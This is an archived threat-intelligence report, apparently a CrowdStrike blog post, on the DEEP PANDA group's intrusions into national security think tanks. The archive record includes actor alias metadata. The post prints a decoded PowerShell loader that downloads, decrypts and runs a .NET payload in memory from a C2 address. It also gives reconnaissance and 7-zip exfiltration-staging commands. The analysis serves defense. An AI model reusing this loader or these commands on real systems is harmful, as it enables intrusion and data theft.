{
    "id": "a1188b8a-b5cd-405a-8df7-51ee0b3a07fc",
    "created_at": "2023-01-12T15:10:23.579145Z",
    "updated_at": "2025-03-27T02:16:43.011185Z",
    "deleted_at": null,
    "sha1_hash": "8dc8a2a08375d18bc2b02e4e36ac72800393b249",
    "title": "2014-07-07 - Deep in Thought- Chinese Targeting of National Security Think Tanks",
    "authors": "",
    "file_creation_date": "2022-05-27T18:59:20Z",
    "file_modification_date": "2022-05-27T18:59:20Z",
    "file_size": 132606,
    "plain_text": "# Deep in Thought: Chinese Targeting of National Security Think Tanks\n\n**[crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/](https://www.crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/)**\n\nCrowdStrike Content Team July 7, 2014\n\nFor some time now, CrowdStrike has been working with a number of national security think\ntanks and human rights organizations on a pro bono basis to help them with their security\nposture. These organizations face some of the most advanced nation-state adversaries —\nChina, Russia, and Iran, just to name a few. The individuals who are typically targeted at\nthese institutions tend to be former senior government officials who still have lots of contacts\nwithin Western governments and, as such, their private correspondence is of extreme\ninterest to these attackers.\n\nThe intelligence services of these nation states are always on the lookout for any clues they\nmay extract from such private communications that may give them an advanced insight into\nwhat options government policy makers are considering on particular issues of interest. At\nthe same time, with access to the victim email mailboxes, the adversaries can craft very\nrealistic spear-phishing lures to the government contacts of targeted think tank personnel by\npiggybacking on ongoing real conversations and increasing their chances of a successful\ncompromise of an official government email account.\n\nDespite this high threat level, these think tanks are organized as non-profits and often do not\nhave the budgets of commercial organizations to afford cutting-edge security technologies\nthat can help them effectively detect these threats. For this reason, CrowdStrike has\nprovided our Falcon Host endpoint security technology to many of these organizations at no\n\n\n-----\n\ncharge to them to help detect and attribute these attackers on their networks in real time, as\nwell as to receive instantaneous full forensic visibility into their behavior to help with full\nremediation of any incident.\n\nRecently, Falcon Host has detected multiple simultaneous compromises at several national\nsecurity think tanks from an actor we call DEEP PANDA, one of the most advanced Chinese\nnation-state cyber intrusion groups. For almost three years now, CrowdStrike has monitored\nDEEP PANDA targeting critical and strategic business verticals including: government,\ndefense, financial, legal, and the telecommunications industries. At the think tanks, Falcon\nHost detected targeting of senior individuals involved in geopolitical policy issues, in\nparticular in the China/Asia Pacific region. However, last week the unprecedented real-time\nvisibility provided by Falcon Host into this actor’s escapades allowed analysts to observe a\nradical change in targeting.\n\nThis actor, who was engaged in targeting and collection of Southeast Asia policy information,\nsuddenly began targeting individuals with a tie to Iraq/Middle East issues. This is\nundoubtedly related to the recent Islamic State of Iraq and the Levant (ISIS) takeover of\nmajor parts of Iraq and the potential disruption for major Chinese oil interests in that country.\nIn fact, Iraq happens to be the fifth-largest source of crude oil imports for China and the\ncountry is the largest foreign investor in Iraq’s oil sector. Thus, it wouldn’t be surprising if the\nChinese government is highly interested in getting a better sense of the possibility of deeper\nU.S. military involvement that could help protect the Chinese oil infrastructure in Iraq. In fact,\nthe shift in targeting of Iraq policy individuals occurred on June 18, the day that ISIS began\nits attack on the Baiji oil refinery.\n\nThe Attacks\n\nCrowdStrike’s Falcon Host technology used by these think tanks consists of a tiny (under\n5mb in size) kernel sensor that is deployed on Windows and Mac servers, desktops, and\nlaptops and is able to do real-time detection and recording of all adversary activities taking\nplace on the system. In addition, by matching the detected activities against our vast\nAdversary Intelligence repository, Falcon Host can automatically attribute the attack to a\nknown adversary group and provide details about their motivations, capabilities, and key\nTactics, Techniques, and Procedures (TTPs).\n\nRecently, we detected breaches of these networks via the use of powershell scripts deployed\nby the adversary as scheduled tasks on Windows machines. The scripts are passed to the\npowershell interpreter through the command line to avoid placement of extraneous files on\nthe victim machine that could potentially trigger AV- or Indicator of Compromise (IOC)-based\ndetection.\n\n\n-----\n\nThe scripts were scheduled to call back every two hours to the DEEP PANDA Command and\nControl (C2) infrastructure.\n\n\n-----\n\nScreen Shot 2014-06-27 at 11.40.50 AM.png\n\n\nThe script in the command line is base64 encoded, but when decoded it translates to the\nfollowing code snippet:\n\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n\n$wc = New-Object -TypeName System.Net.WebClient\n\n$wc.Headers.Add(“Accept-Language”, “en-US,en;q=0.” + ([IntPtr]::Size – 1).ToString())\n\n$wc.Headers.Add(“User-Agent”, “Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1;\nWOW64; Trident/6.0)”)\n\n$rndn = Get-Random\n\n$wc.Headers.Add(“Cookie”, “p=” + $rndn)\n\n\n-----\n\n$data = $wc.DownloadData( https://<ANONYMIZED>/config/oauth/ )\n\n[string[]]$xags = “https://<ANONYMIZED>/config/login/”, “WMITool.Program”, “Main”, “/f”,\n“ssh”, “/s”, “<ANONYMIZED>”, “/p”, “443”\n\n$Passphrase = “<ANONYMIZED>”\n\n$salts = “<ANONYMIZED>”\n\n$r = new-Object System.Security.Cryptography.RijndaelManaged\n\n$pass = [System.Text.Encoding]::UTF8.GetBytes($Passphrase)\n\n$salt = [System.Text.Encoding]::UTF8.GetBytes($salts)\n\n$r.Key = (new-Object Security.Cryptography.PasswordDeriveBytes $pass, $salt, “SHA1”,\n5).GetBytes(32) #256/8\n\n$r.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash(\n\n[Text.Encoding]::UTF8.GetBytes($rndn) )[0..15]\n\n$d = $r.CreateDecryptor()\n\n$ms = new-Object IO.MemoryStream @(,$data)\n\n$cs = new-Object Security.Cryptography.CryptoStream $ms,$d,”Read”\n\n$dfs = New-Object System.IO.Compression.GzipStream $cs,\n([IO.Compression.CompressionMode]::Decompress)\n\n$msout = New-Object System.IO.MemoryStream\n\n[byte[]]$buffer = new-object byte[] 4096\n\n[int]$count = 0\n\ndo\n\n{\n\n$count = $dfs.Read($buffer, 0, $buffer.Length)\n\n$msout.Write($buffer, 0, $count)\n\n} while ($count -gt 0)\n\n$dfs.Close()\n\n\n-----\n\n$cs.Close()\n\n$ms.Close()\n\n$r.Clear()\n\n[byte[]]$bin = $msout.ToArray()\n\n$al = New-Object -TypeName System.Collections.ArrayList\n\n$al.Add($xags)\n\n$asm = [System.Reflection.Assembly]::Load($bin)\n\n$asm.EntryPoint.Invoke($null, $al.ToArray())\n\nsleep 5\n\nExit\n\nOnce executed, it downloads and executes from memory a .NET executable (typically\nnamed Wafer), which in turn typically downloads and runs MadHatter .NET Remote Access\nTool (RAT), one of the favorites of DEEP PANDA. By running them from memory, it leaves no\ndisk artifacts or host-based IOCs that can be identified in forensic analysis. This is typical for\nDEEP PANDA — stealth is their specialty and they prefer to operate in a way that leaves a\nminimal footprint on a victim system and often allows them to evade detection for a very long\ntime.\n\n\n-----\n\ndeeppanda_thinktankblog.png\n\n\nFor this same reason, DEEP PANDA likes to use webshells to keep low-footprint persistent\n[access to the victim network, as we’ve covered in our prior blogs. This case was no](http://www.crowdstrike.com/blog/mo-shells-mo-problems-deep-panda-web-shells/)\nexception, and that initial webshell implant allowed them to execute reconnaissance\ncommands such as “tasklist,” “net view,” and “net localgroup administrators,” and then\nafterward to deploy the powershell scripts.\n\nThe adversary used stolen credentials to mount network shares via “net use” command. In\n[one case, they brought in Cult of the Dead Cow’s NetE tool onto the system, but most of the](http://www.cultdeadcow.com/tools/nete.html)\ntime they leveraged existing Windows tools and avoided bringing many new tools into the\nenvironment that could make them noisy and easily detectable by technologies that scan for\nstatic IOCs.\n\nAfter using compromised credentials to mount file shares, the adversary was seen\ncompressing data using 7-zip. They were adding different document types to compressed\nfiles by wildcarding the extensions such as:\n\n\n-----\n\nC:Program Files7-Zip7z a setup1.log -r -pkkk \\<share name>users<UserName> rtf\n*doc”\n\n“C:Program Files7-Zip7z” a setup1.log -r -pkkk*** “\\<share name>users<UserName>*ppt”\n\nThey knew exactly which users to target based on their research policy area, and they\nrapidly pivoted from China/Asia Pacific policy experts to Iraq/Middle East policy experts once\ntheir tasking collection requirements changed.\n\n\nScreen Shot 2014-06-27 at 11.15.47 AM.png\n\n\n_Aggressive Use of Ping to Determine Which Machines of Interest are Online_\n\nOn one of the compromised machines, the adversary brought in a command-line version of\nRAR archiver that was named “cftmon.exe” and placed it into “c:windowstemphotfix”\ndirectory. The files were encrypted (both file data and headers) with “uinfw” password and\n\n\n-----\n\nthe archive files were named after the initials of each user that had been targeted and stored\nin the same “c:windowstemphotfix” directory.\n\nFor lateral movement, they used WMI to deploy the powershell scripts remotely and setup\nscheduled tasks on the remote systems.\n\n\nScreen Shot 2014-06-27 at 10.58.35 AM.png\n\n\nDespite the fact that we were seeing nearly identical TTPs used across multiple think-tank\ntargets, there is evidence to indicate that these operations had different individuals behind\nthe keyboard based on the intricacies of how certain powershell command lines had been\nused in each case.\n\nSummary\n\n\n-----\n\nDEEP PANDA presents a very serious threat not just to think tanks, but also multinational\nfinancial institutions, law firms, defense contractors, and government agencies. Due to their\nstellar operational security and reliance on anti-forensic and anti-IOC detection techniques,\ndetecting and stopping them is very challenging without the use of next-generation endpoint\ntechnology like Falcon Host. Not only was Falcon Host able to detect this adversary without\nrelying on static signatures or IOCs, but it was able to provide instantaneous and full forensic\nanalysis of what had occurred on each of the compromised endpoints without the need to\npull hard drives and do costly and time-intensive forensics, substantially reducing the time\nneeded for remediation.\n\nIf you are a non-profit think tank or a human rights organization that would like to take\nadvantage of our no-charge offer of Falcon Host licenses for your servers and desktops,\n[please email us at sales@crowdstrike.com with the subject “Non-Profit Falcon Host Offer.”](http://10.10.0.46/mailto:sales@crowdstrike.com)\n\nOur Falcon Intelligence subscribers have had access to multiple reports on the DEEP\nPANDA actor that includes full analysis of their attribution, tradecraft and TTPs, as well as\ndetection indicators and signatures and remediation instructions. And our CrowdStrike\nServices has worked on multiple intrusion investigations related to DEEP PANDA in the last\nyear. If you would also like to see a demo of Falcon Host or Falcon Intelligence in action or\n[discuss our Services offerings, please contact our Sales Team to schedule a personal](http://10.10.0.46/mailto:sales@crowdstrike.com)\nbriefing.\n\n[Stay safe and keep a watchful eye on the Pandas, Bears, Kittens, and other threat actors](https://www.crowdstrike.com/blog/meet-the-adversaries/)\nwho are relentlessly preying on your data!\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2014/2014-07-07 - Deep in Thought- Chinese Targeting of National Security Think Tanks.pdf"
    ],
    "report_names": [
        "2014-07-07 - Deep in Thought- Chinese Targeting of National Security Think Tanks.pdf"
    ],
    "threat_actors": [
        {
            "id": "7a9a7873-8e41-40ae-9d06-b27c92bb54e4",
            "created_at": "2022-10-25T16:47:55.568362Z",
            "updated_at": "2025-03-27T02:05:17.264615Z",
            "deleted_at": null,
            "main_name": "BRONZE FIRESTONE",
            "aliases": [
                "C0d0s0",
                "Deep Panda ",
                "Pupa ",
                "TG-3551 ",
                "APT19 "
            ],
            "source_name": "Secureworks:BRONZE FIRESTONE",
            "tools": [
                " Alice's Rabbit Hole",
                " Briba",
                " Cobalt Strike",
                " Derusbi",
                " PlugX",
                " PoisonIvy",
                " Powershell Empire",
                " Zuguo",
                "9002"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "64ca1755-3883-4173-8e0a-6e5cf92faafd",
            "created_at": "2022-10-25T15:50:23.636456Z",
            "updated_at": "2025-03-27T02:00:55.51077Z",
            "deleted_at": null,
            "main_name": "Deep Panda",
            "aliases": [
                "Deep Panda",
                "Shell Crew",
                "KungFu Kittens",
                "PinkPanther",
                "Black Vine"
            ],
            "source_name": "MITRE:Deep Panda",
            "tools": [
                "Mivast",
                "StreamEx",
                "Sakula",
                "Tasklist",
                "Derusbi"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "46a151bd-e4c2-46f9-aee9-ee6942b01098",
            "created_at": "2023-01-06T13:46:38.288168Z",
            "updated_at": "2025-03-27T02:00:02.794118Z",
            "deleted_at": null,
            "main_name": "APT19",
            "aliases": [
                "Black Vine",
                "TEMP.Avengers",
                "PinkPanther",
                "G0073",
                "KungFu Kittens",
                "Group 13",
                "Shell Crew",
                "BRONZE FIRESTONE",
                "G0009",
                "Sunshop Group",
                "DEEP PANDA",
                "Codoso"
            ],
            "source_name": "MISPGALAXY:APT19",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "0639667a-fb3f-43d9-a38c-6c123fd19c7f",
            "created_at": "2022-10-25T16:07:23.335869Z",
            "updated_at": "2025-03-27T02:02:09.743237Z",
            "deleted_at": null,
            "main_name": "APT 19",
            "aliases": [
                "APT 19",
                "Bronze Firestone",
                "C0d0so0",
                "Codoso",
                "Deep Panda",
                "Operation Kingslayer",
                "Red Pegasus",
                "Sunshop Group",
                "TG-3551"
            ],
            "source_name": "ETDA:APT 19",
            "tools": [
                "Agentemis",
                "C0d0so0",
                "Cobalt Strike",
                "CobaltStrike",
                "Derusbi",
                "EmPyre",
                "EmpireProject",
                "Fire Chili",
                "PowerShell Empire",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536223,
    "ts_updated_at": 1743041803,
    "ts_creation_date": 1653677960,
    "ts_modification_date": 1653677960,
    "files": {
        "pdf": "https://archive.orkl.eu/8dc8a2a08375d18bc2b02e4e36ac72800393b249.pdf",
        "text": "https://archive.orkl.eu/8dc8a2a08375d18bc2b02e4e36ac72800393b249.txt",
        "img": "https://archive.orkl.eu/8dc8a2a08375d18bc2b02e4e36ac72800393b249.jpg"
    }
}